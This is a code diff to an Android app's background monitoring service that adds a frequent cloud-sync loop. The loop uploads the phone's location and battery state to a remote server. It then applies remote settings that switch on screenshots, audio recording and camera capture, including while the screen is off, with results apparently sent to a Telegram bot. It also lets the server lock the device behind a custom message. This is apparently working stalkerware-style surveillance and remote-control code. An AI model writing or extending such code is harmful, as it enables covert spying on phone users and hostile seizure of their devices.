@@ -6,6 +6,10 @@ import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
+import android.os.BatteryManager
+import android.content.pm.PackageManager
+import android.location.LocationManager
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.os.Build
@@ -122,6 +126,20 @@ class MonitorService : Service(), LifecycleOwner {
                 while (isActive) {
                     startForegroundServiceNotification()
                     delay(60000)
+                }
+            }
+
+            // Fast REST Cloud Sync Loop (Minimum 5s, configurable from dashboard)
+            launch {
+                while (isActive) {
+                    val sec = com.example.telegramsender.data.DevicePreferences.getSyncIntervalSeconds(this@MonitorService)
+                    val delayMs = Math.max(5L, sec) * 1000L
+
+                    if (com.example.telegramsender.data.DevicePreferences.isRegistered(this@MonitorService)) {
+                        performCloudSync()
+                    }
+
+                    delay(delayMs)
                 }
             }
 
@@ -475,7 +493,115 @@ class MonitorService : Service(), LifecycleOwner {
         }
     }
 
+    private suspend fun performCloudSync() {
+        val jwt = com.example.telegramsender.data.DevicePreferences.getDeviceJwt(this) ?: return
+        try {
+            // 1. Battery
+            val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { filter ->
+                registerReceiver(null, filter)
+            }
+            val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+            val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
+            val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else 100
+            val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
+            val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
 
+            // 2. Location
+            var lat: Double? = null
+            var lon: Double? = null
+            var accuracy: Float? = null
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                val lm = getSystemService(Context.LOCATION_SERVICE) as? LocationManager
+                if (lm != null) {
+                    var bestLoc: android.location.Location? = null
+                    for (p in lm.getProviders(true)) {
+                        val l = lm.getLastKnownLocation(p) ?: continue
+                        if (bestLoc == null || l.accuracy < bestLoc.accuracy) bestLoc = l
+                    }
+                    if (bestLoc != null) {
+                        lat = bestLoc.latitude
+                        lon = bestLoc.longitude
+                        accuracy = bestLoc.accuracy
+                    }
+                }
+            }
+
+            // 3. Pop executed command IDs
+            val executedIds = com.example.telegramsender.data.DevicePreferences.getAndClearExecutedCommands(this)
+
+            // 4. Hit API
+            val result = com.example.telegramsender.network.ApiClient.syncDevice(
+                deviceJwt = jwt,
+                batteryLevel = batteryPct,
+                isCharging = isCharging,
+                latitude = lat,
+                longitude = lon,
+                accuracy = accuracy,
+                executedCommandIds = executedIds
+            )
+
+            if (result.success) {
+                com.example.telegramsender.data.DevicePreferences.setLastSyncTime(this, System.currentTimeMillis())
+
+                // Apply remote config to preferences
+                val cfg = result.config
+                val pref = getSharedPreferences("tg_pref", MODE_PRIVATE)
+                pref.edit()
+                    .putString("token", cfg.telegramBotToken)
+                    .putString("chatId", cfg.telegramChatId)
+                    .putBoolean("is_monitoring_active", cfg.isMonitoringActive)
+                    .putBoolean("sendScreenshot", cfg.sendScreenshot)
+                    .putLong("screenshotInterval", cfg.screenshotInterval)
+                    .putBoolean("sendLocation", cfg.sendLocation)
+                    .putLong("locationInterval", cfg.locationInterval)
+                    .putBoolean("sendAudio", cfg.sendAudio)
+                    .putLong("audioDuration", cfg.audioDuration)
+                    .putBoolean("audioScreenOff", cfg.audioScreenOff)
+                    .putBoolean("sendCamera", cfg.sendCamera)
+                    .putLong("cameraInterval", cfg.cameraInterval)
+                    .putBoolean("cameraScreenOff", cfg.cameraScreenOff)
+                    .apply()
+
+                com.example.telegramsender.data.DevicePreferences.setSyncIntervalSeconds(this, cfg.syncIntervalSeconds)
+
+                // Handle lock/unlock and pending commands
+                var shouldLock = result.isLocked
+                var lockMsg = result.lockMessage
+
+                for (cmd in result.pendingCommands) {
+                    when (cmd.type) {
+                        "LOCK_DEVICE" -> {
+                            shouldLock = true
+                            val msg = cmd.params?.optString("message")
+                            if (!msg.isNullOrEmpty()) lockMsg = msg
+                        }
+                        "UNLOCK_DEVICE" -> {
+                            shouldLock = false
+                        }
+                        "UPDATE_CONFIG" -> {
+                            val sec = cmd.params?.optLong("syncIntervalSeconds", 0L) ?: 0L
+                            if (sec >= 5) {
+                                com.example.telegramsender.data.DevicePreferences.setSyncIntervalSeconds(this, sec)
+                            }
+                        }
+                    }
+                    com.example.telegramsender.data.DevicePreferences.addExecutedCommand(this, cmd.id)
+                }
+
+                com.example.telegramsender.data.DevicePreferences.setLocked(this, shouldLock, lockMsg)
+
+                if (shouldLock) {
+                    val lockIntent = Intent(this, LockActivity::class.java).apply {
+                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+                        putExtra("LOCK_MESSAGE", lockMsg)
+                    }
+                    startActivity(lockIntent)
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("MonitorService", "Cloud sync loop error", e)
+        }
+    }
 
     override fun onBind(intent: Intent?): IBinder? = null
     
